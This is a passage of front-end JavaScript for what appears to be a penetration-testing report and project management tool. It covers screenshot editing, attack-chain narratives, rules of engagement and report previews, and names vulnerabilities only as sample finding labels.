            alert('Export Screenshots\\n\\nExport options:\\n ZIP archive with all images\\n PDF report with captions\\n HTML gallery\\n CSV metadata\\n Evidence package');
        }
        
        function openBulkEditor() {
            alert('Bulk Edit Mode\\n\\nSelect multiple screenshots to:\\n Apply same redactions\\n Add watermarks\\n Resize images\\n Apply filters\\n Update metadata');
        }
        
        function uploadScreenshot() {
            const title = document.getElementById('screenshotTitle').value;
            const id = document.getElementById('screenshotId').value;
            alert(`Screenshot Uploaded!\\n\\nID: ${id}\\nTitle: ${title}\\n\\nThe screenshot has been added to your gallery and is ready for editing.`);
            closeModal('uploadScreenshotModal');
        }
        
        // Screenshot Editor Functions
        function initializeCanvas() {
            const canvas = document.getElementById('screenshotCanvas');
            if (canvas) {
                canvas.width = 800;
                canvas.height = 600;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#f0f0f0';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#666';
                ctx.font = '24px Arial';
                ctx.textAlign = 'center';
                ctx.fillText('Screenshot Preview', canvas.width/2, canvas.height/2);
            }
        }
        
        function selectTool(tool) {
            currentTool = tool;
            // Update tool button states
            document.querySelectorAll('.editor-tool').forEach(btn => {
                btn.style.background = '';
                btn.style.color = '';
            });
            event.target.style.background = 'var(--button-primary)';
            event.target.style.color = 'white';
            
            console.log('Selected tool:', tool);
        }
        
        function toggleGrid() {
            showGrid = !showGrid;
            event.target.style.background = showGrid ? 'var(--button-primary)' : 'var(--bg-secondary)';
            event.target.style.color = showGrid ? 'white' : '';
            console.log('Grid:', showGrid);
        }
        
        function toggleSnapping() {
            isSnapping = !isSnapping;
            event.target.style.background = isSnapping ? 'var(--button-primary)' : 'var(--bg-secondary)';
            event.target.style.color = isSnapping ? 'white' : '';
            console.log('Snapping:', isSnapping);
        }
        
        function toggleGuides() {
            showGuides = !showGuides;
            event.target.style.background = showGuides ? 'var(--button-primary)' : 'var(--bg-secondary)';
            event.target.style.color = showGuides ? 'white' : '';
            console.log('Guides:', showGuides);
        }
        
        function setZoom(zoomLevel) {
            const canvas = document.getElementById('screenshotCanvas');
            if (canvas) {
                const scale = parseInt(zoomLevel) / 100;
                canvas.style.transform = `scale(${scale})`;
            }
        }
        
        function applyStylePreset(preset) {
            console.log('Applying style preset:', preset);
            const presets = {
                'highlight-red': { stroke: '#ff0000', fill: '#ff000033', width: 3 },
                'highlight-yellow': { stroke: '#ffff00', fill: '#ffff0033', width: 3 },
                'professional': { stroke: '#0066cc', fill: '#0066cc22', width: 2 },
                'minimal': { stroke: '#333333', fill: 'transparent', width: 1 }
            };
            
            if (presets[preset]) {
                document.getElementById('strokeColor').value = presets[preset].stroke;
                document.getElementById('fillColor').value = presets[preset].fill;
                document.getElementById('strokeWidth').value = presets[preset].width;
            }
        }
        
        // Layer Management
        function toggleLayerVisibility(layerId) {
            console.log('Toggle visibility for layer:', layerId);
            event.target.style.opacity = event.target.style.opacity === '0.5' ? '1' : '0.5';
        }
        
        function toggleLayerLock(layerId) {
            console.log('Toggle lock for layer:', layerId);
            event.target.textContent = event.target.textContent === '' ? '' : '';
        }
        
        function moveLayerUp(layerId) {
            console.log('Moving layer up:', layerId);
        }
        
        function moveLayerDown(layerId) {
            console.log('Moving layer down:', layerId);
        }
        
        function addLayer() {
            const layerName = prompt('Enter layer name:');
            if (layerName) {
                console.log('Adding new layer:', layerName);
            }
        }
        
        function groupLayers() {
            alert('Group Selected Layers\\n\\nSelect multiple layers with Ctrl/Cmd+Click, then group them for easier management.');
        }
        
        function flattenLayers() {
            if (confirm('Flatten all layers?\\n\\nThis will merge all visible layers into a single layer. This action cannot be undone.')) {
                console.log('Flattening layers');
            }
        }
        
        function autoDetectSensitive() {
            alert('Auto-detecting Sensitive Information\\n\\nScanning for:\\n Email addresses\\n IP addresses\\n Usernames\\n API keys\\n Personal data\\n\\n3 areas flagged for redaction.');
        }
        
        function undoEdit() {
            console.log('Undo last edit');
        }
        
        function redoEdit() {
            console.log('Redo last edit');
        }
        
        function saveScreenshotEdits() {
            alert('Screenshot Saved\\n\\nYour edits have been saved. The screenshot is now marked as "Edited" in the gallery.');
        }
        
        function exportEditedScreenshot() {
            alert('Export Screenshot\\n\\nExport options:\\n PNG (with transparency)\\n JPG (compressed)\\n PDF (vector graphics)\\n SVG (editable)\\n\\nChoose quality and resolution settings.');
        }
        
        function flattenForRelease() {
            if (confirm('Flatten for Release?\\n\\nThis will:\\n Merge all layers\\n Apply all redactions permanently\\n Remove edit history\\n Optimize file size\\n\\nContinue?')) {
                alert('Screenshot flattened and ready for release.');
            }
        }
        
        function revertToOriginal() {
            if (confirm('Revert to Original?\\n\\nThis will discard all edits and restore the original screenshot. This action cannot be undone.\\n\\nContinue?')) {
                alert('Screenshot reverted to original.');
            }
        }
        
        // Update opacity display
        document.addEventListener('DOMContentLoaded', function() {
            const opacitySlider = document.getElementById('opacity');
            if (opacitySlider) {
                opacitySlider.addEventListener('input', function() {
                    document.getElementById('opacityValue').textContent = this.value + '%';
                });
            }
        });
        
        // Attack Chains Functions
        let selectedFindings = [];
        let chainTemplates = {
            'basic': {
                title: 'Basic Attack Chain Template',
                content: '<h1>Attack Chain Title</h1><h2>Executive Summary</h2><p>Brief overview of the attack chain...</p><h2>Attack Steps</h2><h3>Step 1: Initial Access</h3><p>Description of first step...</p>'
            },
            'web-app': {
                title: 'Web Application Attack Chain',
                content: '<h1>Web Application Compromise</h1><h2>Executive Summary</h2><p>This attack chain demonstrates exploitation of web application vulnerabilities...</p><h2>Attack Steps</h2><h3>Step 1: Reconnaissance</h3><p>Application mapping and vulnerability discovery...</p>'
            },
            'network': {
                title: 'Network Compromise Chain',
                content: '<h1>Network Infrastructure Compromise</h1><h2>Executive Summary</h2><p>Network-level vulnerabilities leading to complete infrastructure compromise...</p><h2>Attack Steps</h2><h3>Step 1: Network Discovery</h3><p>Port scanning and service enumeration...</p>'
            }
        };
        
        function filterChains(filter) {
            console.log('Filtering attack chains by:', filter);
            // Update filter button states
            document.querySelectorAll('.filter-btn').forEach(btn => {
                if (btn.textContent.toLowerCase().includes(filter) || btn.onclick?.toString().includes(`filterChains('${filter}')`)) {
                    btn.classList.add('active');
                    btn.style.background = 'var(--button-primary)';
                    btn.style.color = 'white';
                } else if (btn.onclick?.toString().includes('filterChains')) {
                    btn.classList.remove('active');
                    btn.style.background = '';
                    btn.style.color = '';
                }
            });
        }
        
        function searchChains() {
            const searchTerm = document.getElementById('chainSearch').value.toLowerCase();
            console.log('Searching attack chains for:', searchTerm);
        }
        
        function exportAttackChains() {
            alert('Export Attack Chains\\n\\nExport options:\\n PDF report with all chains\\n Individual chain documents\\n Executive summary only\\n Technical details only\\n Custom template');
        }
        
        function editAttackChain(chainId) {
            document.getElementById('editorChainId').textContent = chainId;
            openModal('attackChainEditorModal');
        }
        
        function cloneAttackChain(chainId) {
            const newId = 'CHAIN-' + String(Math.floor(Math.random() * 1000)).padStart(3, '0');
            alert(`Cloning Attack Chain ${chainId}\\n\\nNew chain created: ${newId}\\n\\nAll content, findings, and screenshots have been copied to the new chain.`);
        }
        
        function exportChain(chainId) {
            alert(`Export ${chainId}\\n\\nExport options:\\n PDF document\\n Word document\\n HTML report\\n Markdown format\\n Include screenshots\\n Executive summary only`);
        }
        
        function updateChainFindings() {
            const checkboxes = document.querySelectorAll('#findingsSelector input[type="checkbox"]:checked');
            const count = checkboxes.length;
            document.getElementById('selectedFindingsCount').textContent = count;
            
            selectedFindings = Array.from(checkboxes).map(cb => cb.value);
        }
        
        function createAttackChain() {
            const title = document.getElementById('chainTitle').value;
            const chainId = document.getElementById('chainId').value;
            const segment = document.getElementById('chainSegment').value;
            const severity = document.getElementById('chainSeverity').value;
            const summary = document.getElementById('chainSummary').value;
            
            if (!title || !segment) {
                alert('Please fill in all required fields (Title and Testing Segment).');
                return;
            }
            
            const chainData = {
                id: chainId,
                title: title,
                segment: segment,
                severity: severity,
                summary: summary,
                findings: selectedFindings
            };
            
            console.log('Creating attack chain:', chainData);
            alert(`Attack Chain Created!\\n\\nID: ${chainId}\\nTitle: ${title}\\nFindings: ${selectedFindings.length}\\n\\nYou can now edit the chain narrative to tell the complete attack story.`);
            
            closeModal('newAttackChainModal');
            // Optionally open the editor
            setTimeout(() => editAttackChain(chainId), 100);
        }
        
        // Attack Chain Editor Functions
        function saveChainDraft() {
            const narrative = document.getElementById('chainNarrative').innerHTML;
            console.log('Saving chain draft:', narrative);
            alert('Chain saved as draft. You can continue editing later.');
        }
        
        function previewChain() {
            const narrative = document.getElementById('chainNarrative').innerHTML;
            const newWindow = window.open('', '_blank', 'width=800,height=600');
            newWindow.document.write(`
                <html>
                    <head><title>Attack Chain Preview</title>
                    <style>
                        body { font-family: 'Segoe UI', sans-serif; line-height: 1.6; padding: 2rem; max-width: 800px; margin: 0 auto; }
                        h1 { color: #dc2626; border-bottom: 2px solid #dc2626; padding-bottom: 0.5rem; }
                        h2 { color: #374151; margin-top: 2rem; }
                        h3 { color: #6b7280; }
                        div[style*="border: 1px dashed"] { border: 2px solid #e5e7eb !important; background: #f9fafb !important; }
                    </style>
                    </head>
                    <body>${narrative}</body>
                </html>
            `);
        }
        
        function saveChainComplete() {
            if (confirm('Mark chain as complete?\\n\\nThis will finalize the attack chain and mark it as ready for review/inclusion in reports.')) {
                alert('Attack chain marked as complete and ready for review.');
                closeModal('attackChainEditorModal');
            }
        }
        
        function removeFindingFromChain(findingId) {
            console.log('Removing finding from chain:', findingId);
            event.target.closest('.finding-item').remove();
        }
        
        function openFindingsModal() {
            alert('Add Finding to Chain\\n\\nSelect from:\\n FIND-004: XSS Vulnerability\\n FIND-008: Authentication Bypass\\n FIND-012: Directory Traversal\\n FIND-015: Privilege Escalation\\n\\nChoose findings that are part of this attack path.');
        }
        
        function insertScreenshot(screenshotId) {
            const editor = document.getElementById('chainNarrative');
            const screenshotHtml = `
                <div style="border: 1px dashed #ccc; padding: 1rem; margin: 1rem 0; border-radius: 4px; background: #f9f9f9; text-align: center; cursor: pointer;" onclick="selectScreenshot(this)">
                    <strong>[Screenshot: ${screenshotId} - Click to configure]</strong>
                    <div style="font-size: 0.875rem; color: #666; margin-top: 0.5rem;">Click to select different screenshot</div>
                </div>
            `;
            
            // Insert at cursor position or end of content
            if (window.getSelection && window.getSelection().rangeCount > 0) {
                const range = window.getSelection().getRangeAt(0);
                range.deleteContents();
                const div = document.createElement('div');
                div.innerHTML = screenshotHtml;
                range.insertNode(div.firstChild);
            } else {
                editor.innerHTML += screenshotHtml;
            }
            
            console.log('Inserted screenshot:', screenshotId);
        }
        
        function selectScreenshot(element) {
            const screenshots = [
                'SCR-001 - SQL Injection Error',
                'SCR-002 - Admin Panel Access',
                'SCR-003 - Network Scan Results',
                'SCR-004 - Privilege Escalation',
                'SCR-005 - Domain Controller Access'
            ];
            
            const choice = prompt('Select screenshot:\\n\\n' + screenshots.map((s, i) => `${i+1}. ${s}`).join('\\n') + '\\n\\nEnter number (1-5):');
            
            if (choice && choice >= 1 && choice <= 5) {
                element.innerHTML = `<strong>[Screenshot: ${screenshots[choice-1]}]</strong><div style="font-size: 0.875rem; color: #666; margin-top: 0.5rem;">Click to select different screenshot</div>`;
            }
        }
        
        // Rich Text Editor Functions
        function formatText(command) {
            document.execCommand(command, false, null);
        }
        
        function insertHeading() {
            const level = prompt('Heading level (1-3):', '2');
            if (level && level >= 1 && level <= 3) {
                document.execCommand('formatBlock', false, `h${level}`);
            }
        }
        
        function insertList() {
            document.execCommand('insertUnorderedList', false, null);
        }
        
        function insertNumberedList() {
            document.execCommand('insertOrderedList', false, null);
        }
        
        function insertCodeBlock() {
            const code = prompt('Enter code:');
            if (code) {
                const codeHtml = `<pre style="background: #f3f4f6; padding: 1rem; border-radius: 4px; border-left: 4px solid #6b7280; overflow-x: auto;"><code>${code}</code></pre>`;
                document.execCommand('insertHTML', false, codeHtml);
            }
        }
        
        function insertScreenshotPlaceholder() {
            const screenshotId = prompt('Screenshot ID (e.g., SCR-001):');
            if (screenshotId) {
                insertScreenshot(screenshotId);
            }
        }
        
        function applyTemplate(templateKey) {
            if (!templateKey) return;
            
            const template = chainTemplates[templateKey];
            if (template && confirm(`Apply "${template.title}" template?\\n\\nThis will replace the current content.`)) {
                document.getElementById('chainNarrative').innerHTML = template.content;
            }
            
            // Reset dropdown
            event.target.value = '';
        }
        
        // Bulk operations
        function bulkExportChains() {
            alert('Bulk Export Attack Chains\\n\\nExport selected chains as:\\n Combined PDF report\\n Individual documents\\n Executive summary package\\n Technical details only');
        }
        
        function bulkUpdateStatus() {
            alert('Bulk Update Status\\n\\nUpdate selected chains to:\\n Draft\\n In Review\\n Complete\\n Archived');
        }
        
        function bulkDeleteChains() {
            if (confirm('Delete selected attack chains?\\n\\nThis action cannot be undone.')) {
                alert('Selected attack chains have been deleted.');
            }
        }
        
        // Dashboard - Constraints and Observations Functions
        function editConstraints() {
            document.getElementById('constraintsContent').style.display = 'none';
            document.getElementById('constraintsEditor').style.display = 'block';
            
            // Set textarea content from the display content
            const currentContent = document.getElementById('constraintsContent').textContent.trim();
            document.getElementById('constraintsText').value = currentContent;
        }
        
        function saveConstraints() {
            const newContent = document.getElementById('constraintsText').value.trim();
            if (!newContent) {
                alert('Constraints and Observations cannot be empty.');
                return;
            }
            
            // Update display content
            document.getElementById('constraintsContent').textContent = newContent;
            
            // Hide editor, show content
            document.getElementById('constraintsEditor').style.display = 'none';
            document.getElementById('constraintsContent').style.display = 'block';
            
            console.log('Constraints saved:', newContent);
            // In real app: save to backend
        }
        
        function cancelConstraintsEdit() {
            // Hide editor, show content without saving
            document.getElementById('constraintsEditor').style.display = 'none';
            document.getElementById('constraintsContent').style.display = 'block';
        }
        
        // Dashboard - Rules of Engagement Functions
        let ruleCounter = 1;
        
        function editRules() {
            document.getElementById('rulesContent').style.display = 'none';
            document.getElementById('rulesEditor').style.display = 'block';
            
            // Populate editor with current rules
            populateRulesEditor();
        }
        
        function populateRulesEditor() {
            const rulesList = document.getElementById('rulesList');
            const currentRules = Array.from(document.querySelectorAll('#rulesContent li')).map(li => li.textContent.trim());
            
            rulesList.innerHTML = '';
            
            currentRules.forEach((rule, index) => {
                const ruleItem = document.createElement('div');
                ruleItem.className = 'rule-item';
                ruleItem.style.cssText = 'display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;';
                
                ruleItem.innerHTML = `
                    <input type="text" class="form-input" value="${rule}" style="flex: 1;">
                    <button class="table-btn danger" onclick="removeRule(this)" title="Remove"></button>
                `;
                
                rulesList.appendChild(ruleItem);
            });
        }
        
        function addRule() {
            const rulesList = document.getElementById('rulesList');
            const ruleItem = document.createElement('div');
            ruleItem.className = 'rule-item';
            ruleItem.style.cssText = 'display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;';
            
            ruleItem.innerHTML = `
                <input type="text" class="form-input" value="New rule..." style="flex: 1;">
                <button class="table-btn danger" onclick="removeRule(this)" title="Remove"></button>
            `;
            
            rulesList.appendChild(ruleItem);
            
            // Focus on the new input
            const newInput = ruleItem.querySelector('input');
            newInput.focus();
            newInput.select();
        }
        
        function removeRule(button) {
            button.closest('.rule-item').remove();
        }
        
        function saveRules() {
            const ruleInputs = document.querySelectorAll('#rulesList input');
            const rules = Array.from(ruleInputs)
                .map(input => input.value.trim())
                .filter(rule => rule.length > 0);
            
            if (rules.length === 0) {
                alert('You must have at least one rule of engagement.');
                return;
            }
            
            // Update display content
            const rulesContent = document.getElementById('rulesContent');
            const rulesList = rules.map(rule => `<li style="margin-bottom: 0.5rem;">${rule}</li>`).join('');
            rulesContent.innerHTML = `<ul style="margin: 0; padding-left: 1.5rem; line-height: 1.6; color: var(--text-secondary);">${rulesList}</ul>`;
            
            // Hide editor, show content
            document.getElementById('rulesEditor').style.display = 'none';
            document.getElementById('rulesContent').style.display = 'block';
            
            console.log('Rules saved:', rules);
            // In real app: save to backend
        }
        
        function cancelRulesEdit() {
            // Hide editor, show content without saving
            document.getElementById('rulesEditor').style.display = 'none';
            document.getElementById('rulesContent').style.display = 'block';
        }
        
        // Initialize default rules if needed
        function initializeDashboard() {
            // This function can be called on page load to set up defaults
            console.log('Dashboard initialized');
        }
        
        // Home Screen Functions
        function openProjectSelector() {
            alert('Open Project\\n\\nSelect from available projects:\\n\\n Acme Corporation - Internal Network Assessment\\n TechStart Web Application Pentest\\n Financial Services Security Review\\n Healthcare Systems Audit\\n E-commerce Platform Review\\n\\nChoose a project to continue working on.');
        }
        
        function openProject(projectId) {
            console.log('Opening project:', projectId);
            alert(`Opening ${projectId}\\n\\nLoading project data and switching to Dashboard view...`);
            
            // Simulate project loading
            setTimeout(() => {
                navigateToScreen('dashboard');
            }, 500);
        }
        
        function viewAllProjects() {
            alert('All Projects\\n\\nThis would show a comprehensive list of all projects with:\\n Search and filter options\\n Project status and progress\\n Team assignments\\n Recent activity\\n Archive and backup options');
        }
        
        function openHelpCenter() {
            alert('Help & Support Center\\n\\nAvailable resources:\\n User Documentation\\n Video Tutorials\\n Methodology Guides\\n Best Practice Tips\\n Contact Support Team\\n Feature Requests\\n Bug Reports\\n\\nWould you like to open the help documentation?');
        }
        
        function openProjectSettings() {
            alert('Project Settings\\n\\nConfigure:\\n Project details and scope\\n Team member access\\n Notification preferences\\n Export and backup settings\\n Client information\\n Engagement timeline\\n Custom fields');
        }
        
        function exportProject() {
            alert('Export Project\\n\\nExport options:\\n Complete project archive\\n Executive summary report\\n Technical findings report\\n Evidence package\\n Raw data export\\n Custom template\\n\\nChoose format: PDF, DOCX, HTML, ZIP');
        }
        
        // Enhanced project creation with better flow
        function createProject() {
            const projectName = document.getElementById('projectName').value;
            const clientName = document.getElementById('clientName').value;
            const projectType = document.getElementById('projectType').value;
            
            if (!projectName || !clientName || !projectType) {
                alert('Please fill in all required fields:\\n Project Name\\n Client Name\\n Project Type');
                return;
            }
            
            const projectId = 'PROJ-' + String(Math.floor(Math.random() * 1000)).padStart(3, '0');
            
            console.log('Creating project:', {
                id: projectId,
                name: projectName,
                client: clientName,
                type: projectType
            });
            
            alert(`Project Created Successfully!\\n\\nProject ID: ${projectId}\\nName: ${projectName}\\nClient: ${clientName}\\nType: ${projectType}\\n\\nRedirecting to project dashboard...`);
            
            closeModal('newProjectModal');
            
            // Simulate project creation and redirect
            setTimeout(() => {
                navigateToScreen('dashboard');
            }, 1000);
        }
        
        // Add some additional utility functions for Home screen
        function getGreeting() {
            const hour = new Date().getHours();
            if (hour < 12) return 'Good Morning';
            if (hour < 18) return 'Good Afternoon';
            return 'Good Evening';
        }
        
        function updateHomeStats() {
            // Function to update home screen statistics
            // In real app: fetch from backend
            console.log('Updating home screen statistics');
        }
        
        // Initialize home screen when loaded
        document.addEventListener('DOMContentLoaded', function() {
            // Update greeting or any home screen specific initialization
            const greeting = getGreeting();
            console.log(`${greeting}! Home screen initialized`);
        });
        
        // Dashboard Project Management Functions
        function editProjectDetails() {
            const currentProject = {
                name: 'Acme Corporation - Internal Network Assessment',
                id: 'PROJ-001',
                client: 'Acme Corporation',
                type: 'Internal Network Assessment',
                status: 'Active',
                startDate: '2024-11-15',
                endDate: '2024-11-22',
                scope: 'Comprehensive security assessment of internal network infrastructure including Active Directory, file servers, and workstations. Testing includes vulnerability assessment, penetration testing, and privilege escalation attempts.'
            };
            
            // In real app: open modal with editable form
            alert(`Edit Project Details\\n\\nProject: ${currentProject.name}\\nID: ${currentProject.id}\\nClient: ${currentProject.client}\\n\\nThis would open a detailed edit form with:\\n Project name and description\\n Client information\\n Timeline and dates\\n Team assignments\\n Scope definition\\n Status updates`);
        }
        
        function editProjectScope() {
            alert('Edit Project Scope\\n\\nThis would open a detailed scope editor allowing you to:\\n\\n Define testing boundaries\\n Specify included/excluded systems\\n Set testing methodologies\\n Configure notification requirements\\n Update success criteria\\n Modify deliverables\\n\\nWould you like to open the scope editor?');
        }
        
        function manageTeamMembers() {
            alert('Manage Team Members\\n\\nCurrent team:\\n\\n John Smith (Lead Consultant)\\n Sarah Johnson (Security Analyst)\\n Mike Chen (Technical Specialist)\\n\\nActions available:\\n Add new team member\\n Modify access permissions\\n Assign roles and responsibilities\\n Set notification preferences\\n Remove team member');
        }
        
        function archiveProject() {
            if (confirm('Archive Project\\n\\nThis will move the project to archived status and restrict editing capabilities. The project data will be preserved for reporting purposes.\\n\\nContinue with archiving?')) {
                alert('Project archived successfully. You can still access read-only data and generate reports from archived projects.');
            }
        }
        
        // Enhanced project settings with validation
        function openProjectSettings() {
            alert('Advanced Project Settings\\n\\nConfigure:\\n General project information\\n Security and access controls\\n Notification and alert settings\\n Custom fields and metadata\\n Integration settings\\n Data retention policies\\n Export and backup options\\n Compliance requirements\\n\\nWould you like to open the settings panel?');
        }
        
        // Report Management Functions
        let currentReportType = 'management';
        let currentSection = 'high-level';
        
        function editReport(reportType) {
            currentReportType = reportType;
            currentSection = 'high-level';
            
            // Update modal title
            const title = document.getElementById('reportEditorTitle');
            if (title) {
                const titles = {
                    'management': 'Management Report',
                    'technical': 'Technical Report',
                    'supplemental': 'Supplemental Report'
                };
                title.textContent = titles[reportType] || 'Report';
            }
            
            // Show appropriate sections for report type
            showReportSections(reportType);
            
            // Open the editor modal
            openModal('reportEditorModal');
        }
        
        function showReportSections(reportType) {
            // Hide all sections first
            const sections = document.querySelectorAll('.section-item');
            sections.forEach(section => section.style.display = 'none');
            
            // Show sections based on report type
            if (reportType === 'management') {
                // Show management report sections
                document.querySelector('[data-section="high-level"]').style.display = 'flex';
                document.querySelector('[data-section="executive"]').style.display = 'flex';
                document.querySelector('[data-section="findings-table"]').style.display = 'flex';
                document.querySelector('[data-section="next-steps"]').style.display = 'flex';
                document.querySelector('[data-section="constraints"]').style.display = 'flex';
            } else if (reportType === 'technical') {
                // Technical report would have different sections
                // For now, show same sections but could be customized
                document.querySelector('[data-section="findings-table"]').style.display = 'flex';
                document.querySelector('[data-section="next-steps"]').style.display = 'flex';
            } else if (reportType === 'supplemental') {
                // Supplemental report sections
                document.querySelector('[data-section="constraints"]').style.display = 'flex';
            }
            
            // Select first visible section
            selectSection(currentSection);
        }
        
        function selectSection(sectionId) {
            currentSection = sectionId;
            
            // Update active section in sidebar
            document.querySelectorAll('.section-item').forEach(item => {
                item.classList.remove('active');
            });
            document.querySelector(`[data-section="${sectionId}"]`)?.classList.add('active');
            
            // Show corresponding content
            document.querySelectorAll('.section-content').forEach(content => {
                content.classList.remove('active');
                content.style.display = 'none';
            });
            
            const activeContent = document.getElementById(`${sectionId}-content`);
            if (activeContent) {
                activeContent.classList.add('active');
                activeContent.style.display = 'block';
            }
            
            // Update section title
            const titleElement = document.getElementById('currentSectionTitle');
            if (titleElement) {
                const titles = {
                    'high-level': 'High Level Summary',
                    'executive': 'Executive Summary',
                    'findings-table': 'Findings Summary Table',
                    'next-steps': 'Next Steps & Recommendations',
                    'constraints': 'Constraints & Limitations'
                };
                titleElement.textContent = titles[sectionId] || 'Section';
            }
            
            // Update template preview if it's the high-level section
            if (sectionId === 'high-level') {
                updateTemplatePreview();
            }
        }
        
        function updateTemplatePreview() {
            const preview = document.getElementById('templatePreview');
            if (!preview) return;
            
            const clientCompany = document.getElementById('clientCompany')?.value || '{{CLIENT_COMPANY}}';
            const target = document.getElementById('target')?.value || '{{TARGET}}';
            const posture = document.getElementById('posture')?.value || '{{POSTURE}}';
            const duration = document.getElementById('duration')?.value || '{{DURATION}}';
            const criticalCount = document.getElementById('criticalFindings')?.value || '{{CRITICAL_COUNT}}';
            const highCount = document.getElementById('highFindings')?.value || '{{HIGH_COUNT}}';
            
            preview.innerHTML = `
                <p><strong>${clientCompany}</strong> engaged our security team to conduct a comprehensive penetration test of their <strong>${target}</strong>. The assessment was performed over <strong>${duration}</strong> and identified several security concerns requiring immediate attention.</p>
                
                <p>Overall, <strong>${clientCompany}</strong>'s security posture is considered <strong>${posture}</strong>. The testing revealed <strong>${criticalCount}</strong> critical vulnerabilities and <strong>${highCount}</strong> high-risk findings that should be prioritized for remediation.</p>
                
                <p>This report provides executive-level visibility into the security findings and recommended next steps for improving the organization's security posture.</p>
            `;
        }
        
        function previewReport() {
            const modal = document.getElementById('reportPreviewModal');
            const content = document.getElementById('reportPreviewContent');
            const titleSpan = document.getElementById('previewReportTitle');
            
            if (titleSpan) {
                const titles = {
                    'management': 'Management Report',
                    'technical': 'Technical Report',
                    'supplemental': 'Supplemental Report'
                };
                titleSpan.textContent = titles[currentReportType] || 'Report';
            }
            
            if (content) {
                content.innerHTML = generateReportPreview();
            }
            
            openModal('reportPreviewModal');
        }
        
        function generateReportPreview() {
            let html = `
                <div style="text-align: center; margin-bottom: 3rem;">
                    <h1 style="color: #1f2937; font-size: 2rem; margin-bottom: 0.5rem;">Security Assessment Report</h1>
                    <h2 style="color: #6b7280; font-size: 1.25rem; margin-bottom: 2rem;">${currentReportType.charAt(0).toUpperCase() + currentReportType.slice(1)} Summary</h2>
                    <hr style="border: 1px solid #e5e7eb; margin: 2rem 0;">
                </div>
            `;
            
            // Add High Level Summary if available
            const clientCompany = document.getElementById('clientCompany')?.value || 'TechCorp Industries';
            const target = document.getElementById('target')?.value || 'External Web Application';
            const posture = document.getElementById('posture')?.value || 'Moderate';
            const duration = document.getElementById('duration')?.value || '5 days';
            const criticalCount = document.getElementById('criticalFindings')?.value || '2';
            const highCount = document.getElementById('highFindings')?.value || '5';
            
            html += `
                <div style="margin-bottom: 3rem;">
                    <h2 style="color: #1f2937; border-bottom: 2px solid #3b82f6; padding-bottom: 0.5rem;">High Level Summary</h2>
                    <p style="margin: 1.5rem 0; line-height: 1.8;"><strong>${clientCompany}</strong> engaged our security team to conduct a comprehensive penetration test of their <strong>${target}</strong>. The assessment was performed over <strong>${duration}</strong> and identified several security concerns requiring immediate attention.</p>
                    
                    <p style="margin: 1.5rem 0; line-height: 1.8;">Overall, <strong>${clientCompany}</strong>'s security posture is considered <strong>${posture}</strong>. The testing revealed <strong>${criticalCount}</strong> critical vulnerabilities and <strong>${highCount}</strong> high-risk findings that should be prioritized for remediation.</p>
                    
                    <p style="margin: 1.5rem 0; line-height: 1.8;">This report provides executive-level visibility into the security findings and recommended next steps for improving the organization's security posture.</p>
                </div>
            `;
            
            // Add Executive Summary if available
            const executiveSummary = document.getElementById('executiveSummaryText')?.value;
            if (executiveSummary) {
                html += `
                    <div style="margin-bottom: 3rem;">
                        <h2 style="color: #1f2937; border-bottom: 2px solid #3b82f6; padding-bottom: 0.5rem;">Executive Summary</h2>
                        <div style="margin: 1.5rem 0; line-height: 1.8; white-space: pre-line;">${executiveSummary}</div>
                    </div>
                `;
            }
            
            // Add Findings Summary Table
            html += `
                <div style="margin-bottom: 3rem;">
                    <h2 style="color: #1f2937; border-bottom: 2px solid #3b82f6; padding-bottom: 0.5rem;">Findings Summary</h2>
                    <table style="width: 100%; border-collapse: collapse; margin: 1.5rem 0;">
                        <thead>
                            <tr style="background: #f3f4f6;">
                                <th style="border: 1px solid #d1d5db; padding: 0.75rem; text-align: left;">Finding</th>
                                <th style="border: 1px solid #d1d5db; padding: 0.75rem; text-align: left;">Severity</th>
                                <th style="border: 1px solid #d1d5db; padding: 0.75rem; text-align: left;">Category</th>
                                <th style="border: 1px solid #d1d5db; padding: 0.75rem; text-align: left;">CVSS</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">SQL Injection in Customer Portal</td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;"><span style="background: #fee2e2; color: #dc2626; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; font-weight: bold;">CRITICAL</span></td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">Web Application</td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">9.1</td>
                            </tr>
                            <tr>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">Inadequate Access Controls</td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;"><span style="background: #fee2e2; color: #dc2626; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; font-weight: bold;">CRITICAL</span></td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">Web Application</td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">8.8</td>
                            </tr>
                            <tr>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">Cross-Site Scripting (XSS)</td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;"><span style="background: #fef3c7; color: #d97706; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; font-weight: bold;">HIGH</span></td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">Web Application</td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">7.2</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            `;
            
            // Add Next Steps
            html += `
                <div style="margin-bottom: 3rem;">
                    <h2 style="color: #1f2937; border-bottom: 2px solid #3b82f6; padding-bottom: 0.5rem;">Next Steps & Recommendations</h2>
                    <table style="width: 100%; border-collapse: collapse; margin: 1.5rem 0;">
                        <thead>
                            <tr style="background: #f3f4f6;">
                                <th style="border: 1px solid #d1d5db; padding: 0.75rem; text-align: left;">Activity</th>
                                <th style="border: 1px solid #d1d5db; padding: 0.75rem; text-align: left;">Description</th>
                                <th style="border: 1px solid #d1d5db; padding: 0.75rem; text-align: left;">Priority</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">Remediate SQL Injection Vulnerabilities</td>
